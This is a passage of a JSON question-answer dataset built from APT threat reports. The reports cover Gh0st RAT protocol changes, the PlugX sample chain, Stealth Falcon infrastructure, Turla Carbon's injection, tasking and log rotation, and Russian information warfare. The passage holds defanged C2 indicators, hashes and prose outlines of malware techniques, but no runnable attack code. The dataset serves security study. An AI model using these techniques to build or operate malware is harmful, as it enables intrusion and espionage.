that can only be reversed at great effort. A little bit of 'sand in the works', so to speak, is enough to further delay the relatively slow-pace of decision-making in the West.14\nCyber power is an important enabler in an attack on NATO's deterrent strategy.\nThe annexation of Crimea also began with a series of covert operations that used a disinformation campaign to create ambiguity and delay Ukraine's response, effectively extending the element of surprise achieved by the Russian gambit. According to Michael Kofman and Matthew Rohansky:\n'Russia's use of broadcast tools for propaganda and psychological operations, part of a broader information campaign to support the Crimean annexation, caught both the Ukraine and the West by surprise. Moscow amped up the alarmist content of its broadcasting . . . stoking fear and confusion in Crimea'.15\nAdmittedly, the annexation was completed using more traditional operations involving conventional units, but the cyber-enabled opening moves not only allowed Russia to test the Western response, but to buy the time needed to create a fait accompli through conventional means.\nWestern analysts have noted that even though the Crimea crisis surprised the West, the Russian effort to integrate television and the internet, especially various\ntypes of social media, into its effort to shape opponents' political perspectives, has been ongoing for quite some time. In a sense, Russia has worked hard to use the internet to shape the political environment of conflict: it has (1) developed internally and externally focused media with a significant online presence; (2) used social media to guarantee that Russian narratives reach the broadest possible audience; and (3) polished their content in terms of language and presentation so that it rings true in various cultural settings.16 These activities have recently been given their own moniker \u2013 trolling \u2013 the practice of creating cyber actors with false identities to communicate tailored messages to an unsuspecting audience.17 According to Keir Giles:\n12 As Michael Kofman and Matthew Rojansky note, 'hybrid warfare,' including the Russian variations used against the Ukraine is not unique. The point here, however, is that Russia is particularly adept as using cyber power in the practice of hybrid warfare; see Kofman and Rojansky, (op cit) p. 2. Other analysts have noted how the Crimea annexation and the additional actions against Ukraine were dependant on capabilities long under development that were especially crafted not to trigger a NATO response; Aleksandr Golts and Heidi Reisinger. 'Russia's Hybrid Warfare: Waging War below the Radar of Traditional Collective Defence,' Research Paper No 105 (Research Division \u2013 NATO Defence College Rome) November 2014.\n13 Owen Matthews. 'BIG READ: Russia leading the way in the cyber arms race,' Irish Examiner, Saturday June 13, 2015. www. irishexaminer.com'lifestyle'feature'big-read-russia-leading-the-way-in-the-cyber-arms-race-336675.html.\n14 The key point is that information denial or dominance does not have to be absolute, it just needs to foster delay and uncertainty in Western political and military decision-making. According to Paul Saunders, 'Russia's seizure of Crimea happened very quickly. U.S. and European decision-making processes just don't move at that speed, particularly when facing ambiguity. Once a Crimea-style operation has begun, it will be extremely difficult if not impossible for Western decision-makers to be sufficiently confident about the other side's intent to take consequential action before it's too late'; Saunders, P. 'Why America Can't Stop Russia's Hybrid Warfare,' The National Interest June 23, 2015. www.nationalinterest.org/feature/shy-america-can't-stop-russias-hybrid-warfare-13166.\n15 Kofman and Rojansky, p. 4.\n'Russian assessments of current events makes it clear that Russia considers itself to be engaged in full-scale information warfare, involving not only offensive but defensive operations \u2013 whether or not its notional adversaries have actually noticed this is happening'.18\nWhat most analysts fail to realise, however, is that Moscow has shaped this cyber-enabled information warfare in a very strategic manner. Cyber power is being wielded as a strategic weapon to create facts on the ground with the minimal use of kinetic force.\nQuestion: Why is Russia's use of cyber-enabled information warfare considered strategic, and what are the implications for NATO's response mechanisms?",
    "output": "Answer: Russia's use of cyber-enabled information warfare is considered strategic because it is wielded as a weapon to create facts on the ground with minimal use of kinetic force. This approach is designed to test the Western response and buy time needed to achieve objectives through conventional means. The implications for NATO's response mechanisms are significant, as the relatively slow pace of decision-making in the West can be further delayed by the 'sand in the works' created by cyber attacks, making it difficult for NATO to reverse the fait accompli without significant effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Standard Gh0st RAT Protocol\nThe standard network protocol for Gh0st RAT 3.6 employs zlib compression, which utilizes 'Gh0st' as a static five-byte packet flag that must be included in the first five bytes of initial transmission from the victim (as seen in Figure 1). During the initial login request, the 3.6 version of Gh0st RAT enumerates system information and transmits that information to the controller. The proceeding eight bytes of the packet contain both compressed and uncompressed size information followed by the zlib compressed data, starting with bytes 78 9C at offset 14 (shown in Figures 1 and 2, below).\nMedium Headline: Victim to controller\nAfter a successful login, the controller returns an acknowledgment to the victim with the correct header using the packet flag which it is programmed to verify, as seen in Figure 2. The connection will be established only if the packet flags match.\nFollowing the first five bytes, the packet then shows the full packet size and the uncompressed data size. The Gh0st packet header for version 3.6 uses the 13-byte format shown in Figure 3:\nAfter the packet flag, packet length and unzip length have been verified, a working connection is created between the victim and the controller. Subsequent keep-alive transmissions ensure a continuous connection.\nOnce Gh0st RAT is connected, the attacker has full remote administration tool (RAT) functionality via the controller. Available remote functionality includes:\n\u2022 Fully functional remote desktop display, including the ability to remotely block user input\n\u2022 Fully functional file manager that lists local and network drives\n\u2022 Ability to interact with running processes\n\u2022 Ability to interact via the command console\n\u2022 Key logging\n\u2022 Audio capture\n\u2022 Webcam capture\n\u2022 Ability to send 'Windows style' alerts to the victim, which can display any text the attacker enters into the controller\nThese features ensure complete remote control of the computer.\nBig Headline: Changes to the Gh0st RAT Protocol\nIn an older version of the customized Gh0st RAT malware, the protocol packet flag is no longer represented by the string 'Gh0st'. The Ghost Dragon group modified the source code and changed the packet flag to 'XYTvn', as seen in Figure 4. The packet structure still implements the same 13-byte header format, including the starting zlib compression bytes of '78 9C':\nSample: f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197\nIn a more recent version of the modified Gh0st RAT malware, Ghost Dragon implemented dynamic packet flags which change the first five bytes of the header in every login request with the controller. This complicates identifying its network traffic, as the header bytes in the zlib compressed data section no longer start with '78 9C', as shown in Figure 5.\nIn some cases this was achieved through a simple XOR obfuscation of the packet data, beginning with the zlib header. SPEAR has observed numerous different XOR keys utilized by the group. No changes to the compression have been found; however, it is trivial to implement a modified compression protocol.\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\n(Note: At the time of this report, the C2 for the sample was active and the malware could still establish an active connection to the Ghost Dragon controller at bbs.winupdate[dot]net. Currently, the domain bbs.winupdate[dot]net resolves to 122.10.18[dot]166).\nThe reply from the active command and control server can be seen in Figure 6:\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\nBig Headline: Connecting to the Ghost Dragon Malware\nAfter successful identification of the malware as Gh0st RAT and confirmation of the modified command and control protocol, the final step toward verification was to connect with the malware to ensure that it would parse the normal Gh0st RAT commands.\nI was able to compile a custom controller from the source code for the purposes of testing the Ghost Dragon malware. I bypassed the header checks looking for the 'Gh0st' packet flag, and reprogrammed the standard Gh0st RAT controller to reply with the packet flag sent from the victim.\nI used sample 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df for testing, which was executed by f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197 during analysis on Windows XP. This sample transmitted the static five byte packet flag 'XYTvn'.\nI ran the victim malware and changed the host's file to point the domain to a host-only IP address. I received a connection attempt from the victim and a response from the controller returned the correct packet flag. Afterward, the keep-alive packets between the victim and controller maintained the connection, which allowed me to test the functionality of 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df with the custom Gh0st RAT controller.\nThe following screen shots were obtained while connected to the malware:\nThe HOSTNAME field shown in Figure 7 was programmed in my custom controller to display 'Gh0st variant', just in case the incoming structure parsed from the victim did not match the format of the default 'LOGININFO' structure from Gh0st RAT 3.6.\nI attained full functionality using the Gh0st 3.6 protocol in the controller, despite the fact that the incoming structure was not exactly what my customized controller expected. As shown in Figure 8, I successfully added an\nadministrative user while remotely connected via my custom Gh0st RAT console within the malware dropped from sample f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197.\nFigure 8 demonstrates that some of the characters in the window are not in English and are not displayed properly on the form. This is due to the fact that the characters were written in Mandarin in the original Gh0st RAT 3.6 source. I changed phrases in the main connection window (Figure 7) for demonstration purposes only.\nThe remaining features of the Gh0st RAT protocol were tested successfully with the custom Gh0st RAT controller while connected to 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df.\nAdditional analysis into other samples is ongoing and more information will be forthcoming.\nNetwork IOCs and Infrastructure Overlap\nQuestion: What steps were taken to verify the functionality of the Ghost Dragon malware, and how was the custom Gh0st RAT controller adapted to communicate with the modified malware?",
    "output": "Answer: To verify the functionality of the Ghost Dragon malware, the researcher compiled a custom controller from the source code and bypassed the header checks looking for the 'Gh0st' packet flag. The standard Gh0st RAT controller was reprogrammed to reply with the packet flag sent from the victim. The researcher used a sample of the malware, executed it on Windows XP, and modified the host's file to point the domain to a host-only IP address. Upon receiving a connection attempt from the victim, the controller responded with the correct packet flag, maintaining the connection with keep-alive packets. This allowed the researcher to test the functionality of the malware using the custom Gh0st RAT controller, achieving full functionality despite the incoming structure not matching the expected format.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 2 Analyzed samples\n\u2022 SampleA-Stage1ofMalware\n\u2013 Description\n*Hashfoundinamalwaredatabase\n\u2013 Originalfilename\n*update.exe\n\u2013 Hashes\n*MD5:f1f48360f95e1b43e9fba0fec5a2afb8\n*SHA1:70ceb467db7b0161d22e4545479f747417b9705a\n*SHA-256:2bc5ce39dd9afe2157448d3f6d8cb9c549ed39543d159616e38480b9e6c11c49\n\u2013 Filetype\n*PE32executable(GUI)Intel80386,forMSWindows,RARself-extractingarchive\n\u2013 Filesize\n*370702Bytes(326KB)\n\u2013 Compiletime\n*SatJun915:19:492012\n\u2022 SampleB-Valid,signedMcAfeebinary\n\u2013 Description\n*FiledroppedbySampleA\n\u2013 Originalfilename\n*mcvsmap.exe\n\u2013 Hashes\n* MD5: 4e1e0b8b0673937415599bf2f24c44ad\n* SHA1: 9224de3af2a246011c6294f64f27206d165317ba\n* SHA-256: ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096\n\u2013 Filetype\n* PE32 executable (GUI) Intel 80386, for MS Windows\n\u2013 Filesize\n* 262672 Bytes (257K)\n\u2013 Compile time\n* Fri May 8 17:59:52 2009\n\u2013 Authenticode5 (<>)verification\n\u2022 Sample C -DLL to be loaded by Sample B, loads Sample D\n\u2013 Description\n* File dropped by Sample A\n\u2013 Original filename\n* McUtil.DLL\n\u2013 Hashes\n* MD5: ad4a646b38a482cc07d5b09b4fffd3b3\n* SHA1: ae0f9bf2740d00c5d485827eb32aca33feaa3a90\n* SHA-256: 0a99238e1ebebc47d7a89b2ccddfae537479f7f77322b5d4941315d3f7e5ca48\n\u2013 Filetype\n* PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\u2013 Filesize\n* 49152 Bytes (48K)\n\u2013 Compile time\n* Wed Mar 13 02:52:28 2013\n\u2022 Sample D -Malicious payload to be loaded by Sample C\n\u2013 Description\n* File dropped by Sample A\n\u2013 Original filename\n* McUtil.DLL.PPT\n\u2013 Hashes\n* MD5: 545bb4365a9b7cdb6d22844ebeedda93\n* SHA1: a267f1183b4ff843d68a63264846abf78cc71d1f\n* SHA-256: d4fe890a08d4dd44b58a3b85b2a7e89536338099c1c42a9b7e85f4007b0a37b7\n\u2013 Filetype\n* pure code (IA32) without headers\n\u2013 Filesize\n* 124820 Bytes (122K)\n\u2013 Compile time\n* unknown (pure code)\n\u2022 Sample E -Stage 2 of Malware\n\u2013 Description\n* Extracted malware from memory\n\u2013 Original filename\n* dump00C60000.bin\n\u2013 Hashes\n* MD5: 65ceb039e7b4731a165cfee081e220af\n* SHA1: b49766187971e3070644a9de2054bc93241b2263\n* SHA-256: deeac56026f3804968348c8afa5b7aba10900aeabee05751c0fcac2b88cff71e\n\u2013 Filetype\n* PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\u2013 Filesize\n* 176128 Bytes (172K)\n\u2013 Compile time\n* Mon Nov 26 04:46:01 2012\n\u2022 Sample F -UAC circumvention\n\u2013 Description\n* File temporarily created on filesystem\n\u2013 Original filename\n* UAC.TMP\n\u2013 Hashes\n* MD5: 52df5c2c07433e2a8f054c2347acb3b4\n* SHA1: 8051474c1fc0d8f404a42ea32eca1699e54f02e1\n* SHA-256: dc09091e5d0ce03c6144748f17bd636f2f0b2ca56f88b550c1d48860596dbdb1\n\u2013 Filetype\n* PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\u2013 Filesize\n* 2560 Bytes (2.5K)\n\u2013 Compile time\n* Thu Mar 29 08:03:43 2012\n1Known variant names: Gulpix, Korplug\n2(<http://satoss.uni.lu/seminars/srm/pdfs/2012-Alexandre-Dulaunoy.pdf>)http://satoss.uni.lu/seminars/srm/pdfs/2012-Alexandre-Dulaunoy.pdf\n3(<http://msdn.microsoft.com/en-us/library/windows/desktop/bb756996.aspx>)http://msdn.microsoft.com/en-us/library/windows/desktop/bb756996.aspx\n4For better readability we do not distinguish between a single author or a group of authors. Hence the expression is a synonym for \"the authors\"\n5(<http://msdn.microsoft.com/en-us/library/ms537359%28v=vs.85%29.aspx>)http://msdn.microsoft.com/en-us/library/ms537359%28v=vs.85%29.aspx\n\nQuestion: In the context of the PlugX APT attack, how does the multi-stage delivery mechanism work, and what role do each of the analyzed samples play in this process?\n\nAnswer:",
    "output": "The PlugX APT attack utilizes a multi-stage delivery mechanism where different components play specific roles to ensure the successful execution of the malware. Here\u2019s a breakdown of the roles of each sample: \\n\\n- **Sample A (Stage 1 of Malware):** This is the initial stage of the malware, often disguised as an update file (update.exe). It acts as a RAR self-extracting archive and drops subsequent files necessary for the next stages of the attack. \\n\\n- **Sample B (Valid, signed McAfee binary):** This is a legitimate McAfee binary (mcvsmap.exe) dropped by Sample A. Its purpose is likely to evade detection by appearing as a valid, signed file. \\n\\n- **Sample C (DLL to be loaded by Sample B, loads Sample D):** This DLL (McUtil.DLL) is dropped by Sample A and is designed to be loaded by Sample B. Its primary function is to load the malicious payload contained in Sample D. \\n\\n- **Sample D (Malicious payload to be loaded by Sample C):** This is the actual malicious payload (McUtil.DLL.PPT), which is executed by Sample C. It contains the core malicious code intended to compromise the system. \\n\\n- **Sample E (Stage 2 of Malware):** This is the second stage of the malware extracted from memory (dump00C60000.bin). It represents the next phase of the attack after the initial infection. \\n\\n- **Sample F (UAC circumvention):** This file (UAC.TMP) is temporarily created on the filesystem and is used to circumvent User Account Control (UAC), allowing the malware to execute with elevated privileges.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 6.2. A fake file sharing site?\nWe identified one aax.me link (http://aax.me/4b708) that points to http://velocityfiles.com/download.php? id=a81abdd8a0c0cd1d5d3b6baadcc9eb18. We visited this link in February 2016, and were served a blank page.\nVelocityFiles appears to have been disabled in March 2016.\nWe found that the site purported to be a file hosting site, where users could register and upload files. However, the registration and signup pages are currently blank, and were blank as of the Internet Archive's oldest capture of the pages in December 2013. We were unable to identify any links to velocityfiles.com from Twitter, or any pages indexed by Google. 89\nThe design of VelocityFiles appeared to be a loosely modified version of a public website design template. Given that the90 site appears to be designed to pose as a public file sharing service, has no obvious public functionality, and was linked to through aax.me, we suspect that it may have been an attack site.\nGiven VelocityFiles' reference to \"FREE MD5 HASHING\" (their emphasis), it is possible that the value of the id parameter in the URL, a81abdd8a0c0cd1d5d3b6baadcc9eb18, represents the MD5 hash of a file. We were, however, unable to locate any file with this MD5 hash.\nMedium Headline: 6.3. Fake web forums?\nWe found an aax.me link91 that pointed to https://call4uaefreedom.com/vb. The domain was registered on 5/15/2013 and expired on 5/15/2015. We were unable to find any webpages or tweets linking to this website. A Google search for \"call4uaefreedom\" reveals a blog, containing five posts, all within a 30 minute span on 4 June 2013, and an empty Twitter account @call4uaefreedom, created in May 2013. Given the suspicious activity associated with the alias \"call4uaefreedom,\" this may have been created by operators.\nWhile searching for domains with similar domain names, we came across uaefreedom.com. The domain name was first registered on 11 June 2010 by the administrators of UAE Hewar, an online discussion forum founded in 2009 that was a92 frequent government target. The domain name expired on 11 June 2011, but was re-registered by a different registrant on 7\nOctober 2012.\nOn 16 October 2012, we find the only tweet linking to uaefreedom.com. A Google search yields no links to the site and we found no passive DNS data available for this domain. The tweet was sent from account @FreeUAE2012, directed at @uaemot. An individual based in Qatar was convicted in absentia on 25 December 2013 for running @uaemot. 93\nOther public tweets involving @FreeUAE2012 included two responses 94 from Ahmed Mansoor to @FreeUAE2012 on 10 October 2012, regarding the 10 October 2012 Citizen Lab report about how Ahmed Mansoor was targeted with Hacking Team spyware. The tweets from @FreeUAE2012 to which Ahmed Mansoor was responding appear to have been deleted.\nThree days later, @FreeUAE2012 attempted to convince Ahmed Mansoor that Tor Browser logged private information of its users, posting a screenshot of the Tor Metrics page, which provides non-sensitive data for researchers. 95\n\nQuestion: How did the Stealth Falcon APT group utilize the VelocityFiles website, and what indications suggest that it might have been an attack site?\n\nAnswer:",
    "output": "The Stealth Falcon APT group utilized the VelocityFiles website by linking to it through an aax.me shortened URL. Several indications suggest that VelocityFiles might have been an attack site. Firstly, the site purported to be a file hosting service but had no obvious public functionality; its registration and signup pages were blank since at least December 2013. Secondly, there were no links to the site from Twitter or any pages indexed by Google. Additionally, the site's design was a loosely modified version of a public website design template, and it was linked through aax.me, which is known to be used by the APT group. The site's reference to 'FREE MD5 HASHING' also suggests that the ID parameter in the URL could represent an MD5 hash of a file, although no file with that hash was located.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ETSO APT use Lateral Movement to achieve its objectives?",
    "output": "Lateral Movement is a critical component of the ETSO APT's attack strategy. The adversary uses Lateral Movement to move through the environment, exploring the network to find their target and subsequently gaining access to it. In the case of the ETSO APT, the attacker uses the acquired ID/Password or NTLM Hash value to create an agreement with the system network to move to, and copy, the back door. The copied backdoor is then executed using the work scheduler, and it is operated using the system authority. The executed back door then broadcasts connection status with the C&C server using the proxy feature, and the attacker approaches the corresponding system based on the broadcast information. The attacker repeats the process until the target system is found, such as a DB. This is a classic example of Lateral Movement, where the adversary is using legitimate credentials with native network and operating system tools to move through the environment undetected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Conclusion\nIn this blog, we have described an ongoing global attack against telecommunications providers that has been active since at least 2017. The threat actor managed to infiltrate into the deepest segments of the providers' network, including some isolated from the internet, as well as compromise critical assets. Our investigation showed that these attacks were targeted, and that the threat actor sought to steal communications data of specific individuals in various countries.\nThroughout this investigation, we have uncovered the infrastructure that facilitated the malicious operations taken by this threat actor. The data exfiltrated by this threat actor, in conjunction with the TTPs and tools used, allowed us to determine with a very high probability that the threat actor behind these malicious operations is backed by a nation\nstate, and is affiliated with China. Our contextualized interpretation of the data suggests that the threat actor is likely APT10, or at the very least, a threat actor that shares, or wishes to emulate its methods by using the same tools, techniques, and motives.\nIt's important to keep in mind that even though the attacks targeted specific individuals, any entity that possesses the power to take over the networks of telecommunications providers can potentially leverage its unlawful access and control of the network to shut down or disrupt an entire cellular network as part of a larger cyber warfare operation.\nDue to multiple and various limitations, we cannot disclose all the information we have gathered on the attack in this report. Our team will continue to monitor and track the threat actor's activity in order to identify more tools and compromised organizations.\nAsk the researchers questions about this attack during their live webinar.\nClosing Notes: This research, which is still ongoing, has been a huge effort for the entire Cybereason Nocturnus team. Special thanks goes to Niv Yona, Noa Pinkas, Josh Trombley, Jakes Jansen, and every single member of the Nocturnus team for the countless hours and effort that were put into this research. We will continue to monitor and update our blog with more information once available and as our investigation progresses.\n\nHow did the threat actor behind Operation SoftCell manage to infiltrate the deepest segments of the telecommunications providers' networks, and what critical assets were compromised? Why is this significant in the context of nation-state backed cyber operations?",
    "output": "The threat actor behind Operation SoftCell managed to infiltrate the deepest segments of the telecommunications providers' networks, including some isolated from the internet, by leveraging sophisticated tactics, techniques, and procedures (TTPs). Critical assets compromised included communication data of specific individuals in various countries. This is significant because it demonstrates the threat actor's ability to penetrate highly secure environments and target specific individuals, indicating a high level of sophistication and resources typically associated with nation-state backed operations. Such capabilities pose a serious risk, as the threat actor could potentially leverage its access to disrupt or shut down entire cellular networks as part of a larger cyber warfare operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nThe Cmstar tool has several interesting features, including a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques, and a hashing algorithm used to find antivirus processes on an infected system. Both of these features are\nnoteworthy and may provide the ability to correlate future tools to the same group and/or malware authors.\nThe URL used by Cmstar to communicate with its C2 server, as well as significant infrastructure overlap, show a direct relationship between the Cmstar downloader, Lurid/Enfal and Cmwhite tools. In a majority of the cases, threat actors using the Cmstar downloader initially register the C2 domains using the email address 'WANGMINGHUA6@GMAIL[.]COM' and later change the registration information to include a different email address. Unit 42 cannot positively confirm that the threat actors control the 'WANGMINGHUA6@GMAIL[.]COM' email address, or if the email address belongs to a reseller that the threat actors buy domains from to create their infrastructure; however, we do believe this is an interesting TTP worth tracking in future infrastructure enumeration.\n1. THE \"LURID\"DOWNLOADER \u2013 Nart Villeneuve and David Sancho \u2013 (<http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf>)http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf\n2. 3. Linking APTs from 2011 and 2014 to an Active Scam Network \u2013 Kiel Wadner \u2013 (<https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam-network>)https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam-network\nQuestion: How does the Cmstar tool's method of manually creating its import address table and its hashing algorithm contribute to the identification and correlation of future tools to the same group or malware authors?",
    "output": "Answer: The Cmstar tool employs a previously unseen method of manually creating its import address table using an API function name character to offset mapping technique. Additionally, it uses a hashing algorithm to identify antivirus processes on an infected system. These unique features are noteworthy because they can serve as distinctive signatures or indicators of compromise (IoCs) that can help cybersecurity experts correlate future tools to the same group or malware authors. By recognizing these specific techniques, analysts can better attribute new malware samples to the same threat actors, enhancing their ability to track and respond to ongoing cyber espionage campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Plugins\nThis malware supports additional plugins to extend its functionalities.\nIn the configuration file, there is a section named \"PLUGINS\". It might not exist when the configuration file is dropped from the loader resources but this file can be updated by the malware. The section \"PLUGINS\" contains a line formed this way:\n%plugin_name%=%enabled%|%mode%[:%username%:%password%]|%file_path%\n%file_path% can be either the path to a PE file or to a file containing a command line to be executed. %enabled% is a string that is used to know if the plugin has to be executed. If it is the case, that string value is \"enabled\".\nThe attribute %mode% is used to control the context in which to execute the PE file/command line. It can be either:\n1 = execution with current user privilege in the current process context through CreateProcess().\n2 = execution as the user specified in the configuration (:%username%:%password% attributes), the token of this specific user is retrieved through the LogonUserAs() function.\n3 = execution in the security context of the user represented by the \"explorer.exe\" token (the token of the process \"explorer.exe\" is duplicated and passed through the\nCreateProcessAsUser() function.\n4 = similar than 3 but the environment variables for the user represented by the \"explorer.exe\" token are retrieved and passed to the function CreateProcessAsUser()\nIf it is a PE file:\nthe file is loaded into the malware process memory\nthe module is parsed to check if it is a DLL\nif the module is a DLL and exports a function \"ModStart\" (since Carbon 3.77) or \"ModuleStart\" (for older versions of Carbon), a new thread is created to execute this function.\nif the module is not a DLL but a valid PE, it is executed from the entry point.\nMedium Headline: Example:\n1 <span class=\"tok-go\">[NAME]</span>\n2 <span class=\"tok-go\">iproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe</span>\nFor each process on the list that is running on the system, if its parent process name is either \"explorer.exe\" or \"ieuser.exe\", the DLL will be injected into this process.\nThe process injection is very classical:\nthe functions \"CreateToolHelp32Snapshot / Module32FirstW / Module32NextW\" are used to retrieve the base address of the module \"kernel32.dll\"\nthe module EAT is parsed to get the address of the function \"LoadLibraryW\"\nthe privilege \"SeDebugPrivilege\" is enabled for the current process\nmemory is allocated into the remote process and the library path is written into it\nNtCreateThreadEx or CreateRemoteThread (if the address of the first function cannot be retrieved) is called to execute LoadLibraryW to load the DLL into the memory of the remote process *\nMedium Headline: Tasks execution\nThe tasks are retrieved from the C&C server.\nThe tasks to be executed by the communication library are listed in the file \"b9s3coff.ax\" (for Carbon v3.7x) or \"cifrado.xml\" (for Carbon v3.8x).\nEach line of this file is composed in the following way:\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath\nThe task file and its config are decrypted (CAST-128) and the task executed. There are some options that are retrieved from the Carbon configuration file: \"time2task\" is used to set a timeout for the task execution (1 hour by default) while \"task_min\" and \"task_max\" are used as to wait a random time between the execution of the tasks on the task list (the random time will be set between \"task_min\" and \"task_max\"). These parameters come from the section [TIME].\nIf the task is a valid DLL file, it is loaded in the current process memory and a new thread is created to execute its \"start\" export. Otherwise, this is probably a command to execute. In this case, the configuration file is parsed. Like the Carbon configuration file, the task configuration file is formed as a windows \"inf\" file and should contain a section [CONFIG] with the following parameters:\n[CONFIG]\nNAME (\"cmd.exe\" by default)\nARG\nRESULT (\"stdout\" by default)\nCOMPRESSION (\"yes\" by default)\nDELETE (\"no\" by default)\nThe command with its arguments is executed through CreateProcess() function and the results are stored in the %task_result_filepath% file if the RESULT option is not set to \"stdout\", while error or additional info are added to the task logfile.\nIf the option RESULT is set to stdout:\nthe result task file is deleted and the task execution output is written to the log task file\nthe line \"task_id | \"1\" | task_log_filepath | object_id\" is added at the end of the file \"C_56743.NLS\" (Carbon 3.7x) or \"dsntype.gif\" (Carbon 3.8x)\nOtherwise:\nthe task execution is outputted to the task result file and the errors / additional info to the task logfile\nthe line \"task_id | \"2\" | task_log_filepath | task_result_filepath | object_id\" is added at the end of the file \"C_56743.NLS\" (Carbon 3.7x) or \"dsntype.gif\" (Carbon 3.8x)\nIn both cases, the same line as written into \"C_56743.NLS\" is also written into the field \"run_task\" from the Carbon configuration file. It might be intended as a way for the malware authors to know which is the last task executed when the configuration file is sent to the C&C server (check \"Configuration file backup\").\nMedium Headline: Log rotation\nThe logfile is backed up and sent to the C&C server periodically (by default this is done every two hours).\nLike the backup of the configuration file, this action is performed only during specific times of the day.\nIndeed, the log rotation will be performed only when the current local time is in the range of what is defined in the configuration file.\nThe fields \"wh_min\" and \"wh_max\" are retrieved from the [TIME] section of the configuration file (by default: 8 and 20). The thread will execute the code only if the current hour of the day is between %wh_min% and %wh_max%.\nIf there is a value for the attribute \"timestop\" from the [TIME] section (which looks like \"wDay:wMonth:wYear:wHour:wMinute\"), the thread will execute the code only after this specific datetime.\nThe attributes \"lastsend\" and \"logperiod\" from the [LOG] section are used to specify a delay time when to backup and send the log to the C&C server. (by default: every two hours).\nA temporary file with a random name prefixed by \"~D\" is created in the folder \"208\" (for Carbon v3.7x) or \"1033\" (for Carbon v3.8x). The logfile content is copied into this new file. It is then compressed with Bzip2 and encrypted (CAST-128).\nA new line is added at the end of the file \"C_56743.NLS\" (for Carbon v3.7x) or \"dsntype.gif\" (for Carbon v3.8x):\n\"10|1|%s|%s\"\n1st field: an ID to identify the file as a logfile\n2nd field: 1 (file to be sent to the C&C server)\n3rd field: the temp file path\n4rd field: the victim uuid\nLast but not least, the attribute \"lastsend\" is updated with the current time and the original logfile is deleted.\nMedium Headline: First request\nA random C&C server address is chosen from the ones in the section \"CW_INET\". If the port and HTTP resource path are not specified, the default is to use port 80 and \"/javascript/view.php\".\nA user agent is set up in the following way:\nthe version of Internet Explorer is retrieved through the registry key: \"HKLM\\Software\\Microsoft\\Internet Explorer\\Version\" and is concatenated to the string \"Mozilla/4.0 (compatible; MSIE %d.0; \"\nexample: \"Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0;\"\nconcatenate the previous string with the OS major/minor version values (through GetVersionExA())\n\"Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0; Windows NT 5.1; Trident/4.0\"\nenumerate the values key in \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Post Platform\" and concatenate each value to the previous string and then append a closing paren.\nexample: \"Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; Media Center PC 6.0; SLCC2)\nThe field \"trans_timemax\" from the section [TIME] is retrieved. It is used to set the timeout for internet requests (through InternetSetOption()). It has a value of 10 minutes by default.\nA first GET request is performed on the root page of the C&C web server to check that the host is alive. If no packet capture is running on the system, a new request is done on the C&C server to check if new tasks are available. A \"PHPSESSID\" cookie is added to the request with the victim uuid as its value. A header \"Referer\" is added as well and set to the C&C server URL.\nThe malware is expecting to get an answer to the GET request similar to:\n<input name=\"%name%\" value=\"%data_in_b64%\">\nIf the field \"value\" contains something, a new task is available.\n\nExplain the log rotation mechanism employed by the Turla group's Carbon malware. How does it ensure that logs are sent to the C&C server periodically?",
    "output": "A: The Carbon malware performs log rotation and sends logs to the C&C server periodically, typically every two hours. This action is performed only during specific times of the day, defined by the 'wh_min' and 'wh_max' fields in the [TIME] section of the configuration file (default values are 8 and 20). If a 'timestop' attribute is present, the log rotation occurs only after the specified datetime. The 'lastsend' and 'logperiod' attributes from the [LOG] section specify the delay for sending the log. During log rotation, a temporary file is created in the '208' (for Carbon v3.7x) or '1033' (for Carbon v3.8x) folder. The logfile content is copied into this new file, which is then compressed with Bzip2 and encrypted using CAST-128. A new line is added to the file 'C_56743.NLS' (for Carbon v3.7x) or 'dsntype.gif' (for Carbon v3.8x) indicating the logfile details. Finally, the 'lastsend' attribute is updated with the current time, and the original logfile is deleted.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
